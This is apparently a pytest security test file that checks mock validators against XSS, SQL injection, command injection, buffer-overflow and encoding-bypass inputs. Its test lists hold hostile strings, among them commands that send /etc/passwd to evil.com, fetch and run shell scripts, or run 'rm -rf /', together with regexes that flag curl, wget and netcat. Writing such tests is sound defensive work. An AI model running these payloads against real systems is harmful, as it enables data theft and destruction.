"""
Security tests for input validation attacks
Testing XSS injection, SQL injection, command injection, buffer overflow, and encoding bypass attempts
"""

import pytest
import re
import html
import time
from typing import Dict, Any, List, Optional, Union
from unittest.mock import Mock, patch, MagicMock

from tests.utils.base_test_classes import SecurityTestCase


class TestInputValidationSecurity(SecurityTestCase):
    """Test input validation security vulnerabilities"""

    @pytest.fixture(autouse=True)
    def setup_input_validation_security(self):
        """Setup input validation security testing environment"""
        # Input validation patterns
        self.xss_patterns = [
            r"<script[^>]*>.*?</script>",
            r"javascript:",
            r"on\w+\s*=",  # onclick=, onload=, etc.
            r"<iframe[^>]*>",
            r"<object[^>]*>",
            r"<embed[^>]*>",
            r"vbscript:",
            r"data:text/html",
            r"<img[^>]*on\w+\s*=[^>]*>",
        ]

        self.sql_injection_patterns = [
            r"(?i)(drop\s+table|delete\s+from|insert\s+into)",
            r"(?i)(update\s+\w+\s+set)",
            r"(?i)(union\s+select)",
            r"(?i)(exec\s*\(|xp_|sp_)",
            r"(?i)(--|/\*|\*/)",
            r"(?i)(\'\s*or\s*\'1\'=\'1|\'\s*or\s*1=1)",
            r'(?i)("\s*or\s*"1"="1")',
            r"(?i)(1=1\s*--)",
        ]

        self.command_injection_patterns = [
            r"(?i)(;|\||&)\s*(rm|del|format|fdisk)",
            r"(?i)(;|\||&)\s*(curl|wget|nc|netcat)",
            r"(?i)(;|\||&)\s*(python|perl|ruby|bash|sh)",
            r"(?i)(`[^`]*`|\$[^)]*\))",
            r"(?i)(eval\s*\(|exec\s*\()",
        ]

        # Mock input validator
        self.input_validator = Mock()
        self.input_validator.max_string_length = 10000
        self.input_validator.allowed_tags = [
            "p",
            "b",
            "i",
            "em",
            "strong",
            "a",
            "ul",
            "ol",
            "li",
        ]
        self.input_validator.allowed_attributes = {
            "a": ["href", "title"],
            "img": ["src", "alt", "title", "width", "height"],
        }

    def test_xss_injection_prevention(self):
        """Test XSS injection attack prevention"""

        def sanitize_html_input(input_str: str) -> Dict[str, Any]:
            """Sanitize HTML input to prevent XSS"""
            if not isinstance(input_str, str):
                return {"safe": True, "sanitized": ""}

            # Check length limits
            if len(input_str) > self.input_validator.max_string_length:
                return {"safe": False, "reason": "Input too long"}

            # URL decode check for bypass attempts
            import urllib.parse

            try:
                decoded_input = urllib.parse.unquote(input_str)
                # Check for XSS patterns in decoded input too
                for pattern in self.xss_patterns:
                    if re.search(pattern, decoded_input, re.IGNORECASE | re.DOTALL):
                        return {
                            "safe": False,
                            "reason": f"XSS pattern detected in URL encoding: {pattern}",
                        }
            except:
                pass  # If decoding fails, continue with original

            # HTML entity decode check for bypass attempts
            try:
                html_decoded = html.unescape(input_str)
                # Check for XSS patterns in HTML decoded input too
                for pattern in self.xss_patterns:
                    if re.search(pattern, html_decoded, re.IGNORECASE | re.DOTALL):
                        return {
                            "safe": False,
                            "reason": f"XSS pattern detected in HTML entities: {pattern}",
                        }
            except:
                pass  # If decoding fails, continue with original

            # Check for XSS patterns in original input
            for pattern in self.xss_patterns:
                if re.search(pattern, input_str, re.IGNORECASE | re.DOTALL):
                    return {"safe": False, "reason": f"XSS pattern detected: {pattern}"}

            # HTML entity encoding
            sanitized = html.escape(input_str)

            # Additional sanitization for specific contexts
            sanitized = re.sub(r"javascript:", "", sanitized, flags=re.IGNORECASE)
            sanitized = re.sub(r"on\w+\s*=", "", sanitized, flags=re.IGNORECASE)

            return {"safe": True, "sanitized": sanitized}

        # Test XSS injection attempts
        xss_attacks = [
            # Script tag injections
            '<script>alert("XSS")</script>',
            '<SCRIPT SRC="http://evil.com/xss.js"></SCRIPT>',
            '<script>document.location="http://evil.com"</script>',
            # JavaScript protocol
            'javascript:alert("XSS")',
            "JavaScript:document.cookie",
            'javascript:void(document.location="http://evil.com")',
            # Event handlers
            '<img src="x" onerror="alert(\'XSS\')">',
            "<body onload=\"alert('XSS')\">",
            "<div onclick=\"alert('XSS')\">Click me</div>",
            # Iframe and object
            "<iframe src=\"javascript:alert('XSS')\"></iframe>",
            "<object data=\"javascript:alert('XSS')\"></object>",
            "<embed src=\"javascript:alert('XSS')\">",
            # VBScript
            'vbscript:msgbox("XSS")',
            # Data URI
            'data:text/html,<script>alert("XSS")</script>',
            # Encoded variants
            "%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E",
            "&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;",
            # Mixed case
            '<ScRiPt>alert("XSS")</ScRiPt>',
            '<SCRIPT>alert("XSS")</SCRIPT>',
        ]

        for xss_attack in xss_attacks:
            result = sanitize_html_input(xss_attack)
            assert result["safe"] is False, f"XSS attack not detected: {xss_attack}"
            assert (
                "XSS pattern" in result["reason"]
                or "Input too long" in result["reason"]
            )

        # Test safe content is allowed
        safe_content = [
            "This is safe content",
            "Philosophical text about consciousness",
            'Link to <a href="https://example.com">example</a>',
            "<b>Bold text</b> and <i>italic text</i>",
            "<p>Paragraph with <strong>strong</strong> emphasis</p>",
        ]

        for content in safe_content:
            result = sanitize_html_input(content)
            assert result["safe"] is True, f"Safe content was blocked: {content}"
            assert result["sanitized"] is not None

    def test_sql_injection_prevention(self):
        """Test SQL injection attack prevention"""

        def sanitize_sql_input(input_str: str) -> Dict[str, Any]:
            """Sanitize input to prevent SQL injection"""
            if not isinstance(input_str, str):
                return {"safe": True, "sanitized": ""}

            # Check for SQL injection patterns
            for pattern in self.sql_injection_patterns:
                if re.search(pattern, input_str):
                    return {
                        "safe": False,
                        "reason": f"SQL injection pattern detected: {pattern}",
                    }

            # Escape SQL special characters
            sanitized = input_str.replace("'", "''").replace('"', '""')

            # Remove comments
            sanitized = re.sub(r"--.*$", "", sanitized, flags=re.MULTILINE)
            sanitized = re.sub(r"/\*.*?\*/", "", sanitized, flags=re.DOTALL)

            return {"safe": True, "sanitized": sanitized}

        # Test SQL injection attempts
        sql_injection_attacks = [
            # Classic injections
            "' OR '1'='1",
            "' OR 1=1 --",
            '" OR "1"="1',
            "1' OR '1'='1' --",
            # Union-based attacks
            "' UNION SELECT username,password FROM users --",
            "1 UNION SELECT @@version --",
            "' UNION SELECT NULL,table_name FROM information_schema.tables --",
            # Comment-based attacks
            "admin'--",
            "admin'/*",
            "1' OR '1'='1'/*",
            # Stored procedure attacks
            "'; EXEC xp_cmdshell('dir') --",
            "'; DROP TABLE users --",
            "'; DELETE FROM users WHERE '1'='1' --",
            # Time-based attacks
            "'; WAITFOR DELAY '00:00:05' --",
            "' AND SLEEP(5) --",
            # Advanced encoding attempts
            "%27%20OR%20%271%27%3D%271",  # URL encoded ' OR '1'='1'
            "%27%20UNION%20SELECT%20*%20FROM%20users--",  # URL encoded UNION attack
            # Numeric bypasses
            "1 OR 1=1",
            "0 OR 1=1",
        ]

        for sql_attack in sql_injection_attacks:
            result = sanitize_sql_input(sql_attack)
            assert result["safe"] is False, f"SQL injection not detected: {sql_attack}"
            assert "SQL injection pattern" in result["reason"]

        # Test safe database queries
        safe_queries = [
            "john_doe",
            "user123",
            "philosophy_article",
            "2024-01-15",
            "normal search term",
            "article title with spaces",
        ]

        for safe_query in safe_queries:
            result = sanitize_sql_input(safe_query)
            assert result["safe"] is True, f"Safe query was blocked: {safe_query}"
            assert result["sanitized"] is not None

    def test_command_injection_prevention(self):
        """Test command injection attack prevention"""

        def sanitize_command_input(input_str: str) -> Dict[str, Any]:
            """Sanitize input to prevent command injection"""
            if not isinstance(input_str, str):
                return {"safe": True, "sanitized": ""}

            # Check for command injection patterns
            for pattern in self.command_injection_patterns:
                if re.search(pattern, input_str):
                    return {
                        "safe": False,
                        "reason": f"Command injection pattern detected: {pattern}",
                    }

            # Remove dangerous characters
            dangerous_chars = [";", "|", "&", "`", "$", "(", ")", "<", ">", '"', "'"]
            sanitized = input_str

            for char in dangerous_chars:
                sanitized = sanitized.replace(char, "")

            # Additional validation
            if re.search(r"\.\./", sanitized):  # Path traversal
                return {"safe": False, "reason": "Path traversal detected"}

            return {"safe": True, "sanitized": sanitized}

        # Test command injection attempts
        command_injection_attacks = [
            # Command separators
            "filename; rm -rf /",
            "input | cat /etc/passwd",
            "data && curl evil.com/steal.sh | sh",
            # Backticks and substitution
            "`whoami`",
            "$(id)",
            "${HOME}",
            # Direct commands
            "; wget http://evil.com/malware.sh",
            "| python -c 'import os; os.system(\"rm -rf /\")'",
            "& perl -e 'system(\"curl evil.com\")'",
            # Chained attacks
            "normal_input; curl -X POST -d @/etc/passwd evil.com",
            "user_input && rm /important/file",
            # Encoding bypasses
            "%3B%20rm%20-rf%20%2F",  # ; rm -rf /
            "%7C%20cat%20%2Fetc%2Fpasswd",  # | cat /etc/passwd
            # Path traversal in commands
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            # Script execution
            "; exec('malicious code')",
            "& eval('system(\"ls\")')",
        ]

        for cmd_attack in command_injection_attacks:
            result = sanitize_command_input(cmd_attack)
            assert result["safe"] is False, (
                f"Command injection not detected: {cmd_attack}"
            )
            assert (
                "Command injection pattern" in result["reason"]
                or "Path traversal detected" in result["reason"]
            )

        # Test safe command inputs
        safe_commands = [
            "document.pdf",
            "image.jpg",
            "normal_filename.txt",
            "user_data_2024",
            "philosophy-article",
            "valid_content_123",
        ]

        for safe_cmd in safe_commands:
            result = sanitize_command_input(safe_cmd)
            assert result["safe"] is True, f"Safe command input was blocked: {safe_cmd}"
            assert result["sanitized"] is not None

    def test_buffer_overflow_prevention(self):
        """Test buffer overflow attack prevention"""

        def check_buffer_limits(
            input_data: Union[str, bytes], max_length: int = 10000
        ) -> Dict[str, Any]:
            """Check for buffer overflow attempts"""

            if isinstance(input_data, str):
                length = len(input_data)
                if length > max_length:
                    return {
                        "safe": False,
                        "reason": f"String too long: {length} > {max_length}",
                    }

                # Check for repeated patterns (common in buffer overflow attacks)
                # Look for any character repeated 500+ times
                for char in set(input_data):
                    if input_data.count(char) >= 500:
                        return {
                            "safe": False,
                            "reason": "Suspicious repeated pattern detected",
                        }

            elif isinstance(input_data, bytes):
                length = len(input_data)
                if length > max_length:
                    return {
                        "safe": False,
                        "reason": f"Byte array too long: {length} > {max_length}",
                    }

                # Check for NOP sleds (common in exploits)
                if b"\x90" * 100 in input_data:
                    return {"safe": False, "reason": "NOP sled detected"}

                # Check for repeated byte patterns
                for byte_val in set(input_data):
                    if input_data.count(byte_val) >= 500:
                        return {
                            "safe": False,
                            "reason": "Suspicious repeated byte pattern detected",
                        }

            return {"safe": True}

        # Test buffer overflow attempts
        overflow_attacks = [
            # Long strings (caught by length check)
            "A" * 10001,
            "B" * 50000,
            "C" * 100000,
            # Repeated patterns (caught by pattern check)
            "X" * 1000,  # 1000 > 500 threshold
            "patternpatternpattern" * 1000,  # Very long repeated pattern
            # Unicode overflow attempts
            "\ufffd" * 1000,  # 1000 > 500 threshold
            "😀" * 1000,  # 1000 > 500 threshold
            # Format string attacks
            "%s" * 1000,  # 1000 > 500 threshold
            "%x" * 1000,  # 1000 > 500 threshold
            "%n" * 1000,  # 1000 > 500 threshold
            # Binary overflow attempts
            b"A" * 10001,  # Caught by length check
            b"\x90" * 1000,  # NOP sled (special detection)
            b"\x41\x41\x41\x41" * 2500,  # Repeated 'A' in hex - length > 10000
        ]

        for overflow_attack in overflow_attacks:
            result = check_buffer_limits(overflow_attack)
            assert result["safe"] is False, (
                f"Buffer overflow not detected: {type(overflow_attack)}"
            )

        # Test safe inputs
        safe_inputs = [
            "Normal length string",
            "Philosophical content about consciousness",
            "A" * 100,  # Reasonable repetition
            "Short string",
            b"Normal byte array",
            b"Short bytes",
        ]

        for safe_input in safe_inputs:
            result = check_buffer_limits(safe_input)
            assert result["safe"] is True, f"Safe input was flagged: {safe_input}"

    def test_encoding_bypass_attempts(self):
        """Test encoding bypass attempt prevention"""

        def detect_encoding_bypass(input_str: str) -> Dict[str, Any]:
            """Detect various encoding bypass attempts"""
            bypass_detected = False
            bypass_type = None

            # URL encoding bypasses
            if "%" in input_str:
                try:
                    import urllib.parse

                    decoded = urllib.parse.unquote(input_str)

                    # Check if decoded content contains malicious patterns
                    if any(
                        pattern in decoded.lower()
                        for pattern in [
                            "<script",
                            "javascript:",
                            "alert(",
                            "or 1=1",
                            "union select",
                        ]
                    ):
                        bypass_detected = True
                        bypass_type = "url_encoding"
                except:
                    bypass_detected = True
                    bypass_type = "malformed_url_encoding"

            # HTML entity encoding
            if ("&" in input_str and ";" in input_str) and not bypass_detected:
                decoded = html.unescape(input_str)
                if any(
                    pattern in decoded.lower()
                    for pattern in ["<script", "javascript:", "alert(", "onerror"]
                ):
                    bypass_detected = True
                    bypass_type = "html_entity_encoding"

            # Unicode encoding
            if "\\u" in input_str and not bypass_detected:
                try:
                    decoded = input_str.encode().decode("unicode_escape")
                    if any(
                        pattern in decoded.lower()
                        for pattern in ["<script", "javascript:", "alert(", "onerror"]
                    ):
                        bypass_detected = True
                        bypass_type = "unicode_encoding"
                except:
                    bypass_detected = True
                    bypass_type = "malformed_unicode"

            # Base64 encoding
            if len(input_str) > 10 and all(
                c in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
                for c in input_str
            ):
                try:
                    import base64

                    decoded = base64.b64decode(input_str).decode(
                        "utf-8", errors="ignore"
                    )
                    if any(
                        pattern in decoded.lower()
                        for pattern in ["<script", "javascript:", "alert(", "onerror"]
                    ):
                        bypass_detected = True
                        bypass_type = "base64_encoding"
                except:
                    pass  # Might not be base64

            # Hex encoding
            if re.match(r"^[0-9a-fA-F\s]+$", input_str):
                try:
                    decoded = bytes.fromhex(re.sub(r"\s", "", input_str)).decode(
                        "utf-8", errors="ignore"
                    )
                    if any(
                        pattern in decoded.lower()
                        for pattern in ["<script", "javascript:", "alert(", "onerror"]
                    ):
                        bypass_detected = True
                        bypass_type = "hex_encoding"
                except:
                    pass

            if bypass_detected:
                return {
                    "safe": False,
                    "reason": f"Encoding bypass detected: {bypass_type}",
                }

            return {"safe": True}

        # Test encoding bypass attempts
        encoding_bypass_attacks = [
            # URL encoding
            "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",  # <script>alert('XSS')</script>
            "%27%20OR%20%271%27%3D%271",  # ' OR '1'='1'
            "%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E",  # <img src=x onerror=alert('XSS')>
            # HTML entity encoding
            "&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;",
            "&quot; OR &quot;1&quot;=&quot;1&quot;",
            "&lt;img src=x onerror=alert(&apos;XSS&apos;)&gt;",
            # Unicode encoding
            "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
            "\\u0027 OR \\u00271\\u0027=\\u00271",
            # Base64 encoding (of malicious content)
            "PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",  # <script>alert('XSS')</script>
            # Hex encoding
            "3c7363726970743e616c657274282758535327293c2f7363726970743e",  # <script>alert('XSS')</script>
            # Double encoding
            "%253Cscript%253Ealert%2528%2527XSS%2527%2529%253C%252Fscript%253E",  # Double URL encoded
        ]

        for bypass_attack in encoding_bypass_attacks:
            result = detect_encoding_bypass(bypass_attack)
            assert result["safe"] is False, (
                f"Encoding bypass not detected: {bypass_attack}"
            )
            assert "Encoding bypass detected" in result["reason"]

        # Test safe encoded content
        safe_encoded = [
            "Hello%20World",  # URL encoded "Hello World"
            "Philosophy%20and%20Consciousness",  # Safe URL encoding
            "&amp;lt;b&amp;gt;Bold&amp;lt;/b&amp;gt;",  # HTML entities (already encoded)
            "SGVsbG8gV29ybGQ=",  # Base64 "Hello World"
            "48656c6c6f20576f726c64",  # Hex "Hello World"
        ]

        for safe_content in safe_encoded:
            result = detect_encoding_bypass(safe_content)
            assert result["safe"] is True, (
                f"Safe encoded content was flagged: {safe_content}"
            )

    def test_comprehensive_input_validation(self):
        """Test comprehensive input validation across all attack types"""

        def comprehensive_validate(
            input_data: Union[str, bytes], context: str = "general"
        ) -> Dict[str, Any]:
            """Comprehensive input validation"""

            # Initial type check
            if not isinstance(input_data, (str, bytes)):
                return {"safe": False, "reason": "Invalid input type"}

            # Convert bytes to string for validation
            if isinstance(input_data, bytes):
                try:
                    input_str = input_data.decode("utf-8")
                except UnicodeDecodeError:
                    return {"safe": False, "reason": "Invalid byte sequence"}
            else:
                input_str = input_data

            # Length check
            if len(input_str) > self.input_validator.max_string_length:
                return {"safe": False, "reason": "Input exceeds maximum length"}

            # XSS check
            for pattern in self.xss_patterns:
                if re.search(pattern, input_str, re.IGNORECASE | re.DOTALL):
                    return {"safe": False, "reason": f"XSS detected: {pattern}"}

            # SQL injection check
            for pattern in self.sql_injection_patterns:
                if re.search(pattern, input_str):
                    return {
                        "safe": False,
                        "reason": f"SQL injection detected: {pattern}",
                    }

            # Command injection check
            for pattern in self.command_injection_patterns:
                if re.search(pattern, input_str):
                    return {
                        "safe": False,
                        "reason": f"Command injection detected: {pattern}",
                    }

            # Context-specific validation
            if context == "filename":
                # Additional filename-specific checks
                if re.search(r'[<>:"/\\|?*]', input_str):
                    return {"safe": False, "reason": "Invalid filename characters"}

                if re.search(r"\.\.", input_str):
                    return {"safe": False, "reason": "Path traversal in filename"}

            elif context == "url":
                # URL-specific validation
                if not (
                    input_str.startswith("http://")
                    or input_str.startswith("https://")
                    or input_str.startswith("/")
                ):
                    return {"safe": False, "reason": "Invalid URL format"}

            elif context == "email":
                # Email-specific validation
                email_pattern = r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$"
                if not re.match(email_pattern, input_str):
                    return {"safe": False, "reason": "Invalid email format"}

            # Buffer overflow check
            if re.search(r"(.)\1{100,}", input_str):
                return {"safe": False, "reason": "Suspicious repeated pattern"}

            return {"safe": True, "sanitized": html.escape(input_str)}

        # Test comprehensive validation with various inputs
        test_cases = [
            # Malicious inputs
            ("<script>alert('XSS')</script>", "general", False),
            ("' OR '1'='1", "general", False),
            ("; rm -rf /", "filename", False),
            ("../../../etc/passwd", "filename", False),
            ("A" * 10001, "general", False),
            ("javascript:alert('XSS')", "url", False),
            # Safe inputs
            ("Philosophical article content", "general", True),
            ("document.pdf", "filename", True),
            ("https://example.com/article", "url", True),
            ("user@example.com", "email", True),
            ("Normal content length", "general", True),
        ]

        for input_data, context, should_be_safe in test_cases:
            result = comprehensive_validate(input_data, context)

            if should_be_safe:
                assert result["safe"] is True, (
                    f"Safe input was blocked: {input_data} in context {context}"
                )
                assert "sanitized" in result
            else:
                assert result["safe"] is False, (
                    f"Dangerous input was allowed: {input_data} in context {context}"
                )
                assert "reason" in result

    def test_input_sanitization_output(self):
        """Test that input sanitization produces safe output"""

        def sanitize_for_output(input_str: str, output_context: str = "html") -> str:
            """Sanitize input for specific output context"""

            if output_context == "html":
                # HTML context
                sanitized = html.escape(input_str)
                sanitized = re.sub(r"javascript:", "", sanitized, flags=re.IGNORECASE)
                sanitized = re.sub(r"on\w+\s*=", "", sanitized, flags=re.IGNORECASE)

            elif output_context == "javascript":
                # JavaScript context
                sanitized = input_str.replace("\\", "\\\\")
                sanitized = sanitized.replace("'", "\\'")
                sanitized = sanitized.replace('"', '\\"')
                sanitized = sanitized.replace("\n", "\\n")
                sanitized = sanitized.replace("\r", "\\r")
                sanitized = sanitized.replace("\t", "\\t")

            elif output_context == "sql":
                # SQL context
                sanitized = input_str.replace("'", "''")
                sanitized = sanitized.replace('"', '""')
                sanitized = re.sub(r"--.*$", "", sanitized, flags=re.MULTILINE)
                sanitized = re.sub(r"/\*.*?\*/", "", sanitized, flags=re.DOTALL)

            elif output_context == "url":
                # URL context
                import urllib.parse

                sanitized = urllib.parse.quote(input_str, safe="")

            else:
                # General context
                sanitized = html.escape(input_str)

            return sanitized

        # Test dangerous inputs are properly sanitized
        dangerous_inputs = [
            '<script>alert("XSS")</script>',
            "'; DROP TABLE users; --",
            "javascript:alert('XSS')",
            " onclick=\"alert('XSS')\"",
        ]

        for dangerous_input in dangerous_inputs:
            # HTML output
            html_output = sanitize_for_output(dangerous_input, "html")
            self.assert_no_xss_vulnerability(html_output)

            # JavaScript output
            js_output = sanitize_for_output(dangerous_input, "javascript")
            assert "<script" not in js_output
            assert "alert(" not in js_output or js_output.count("alert(") == 0

            # SQL output
            sql_output = sanitize_for_output(dangerous_input, "sql")
            self.assert_no_sql_injection(sql_output)

        # Test safe inputs remain readable
        safe_inputs = [
            "Philosophical discussion",
            "Article about consciousness",
            "Normal user input",
        ]

        for safe_input in safe_inputs:
            for context in ["html", "javascript", "sql", "url"]:
                output = sanitize_for_output(safe_input, context)
                assert output is not None
                assert len(output) > 0
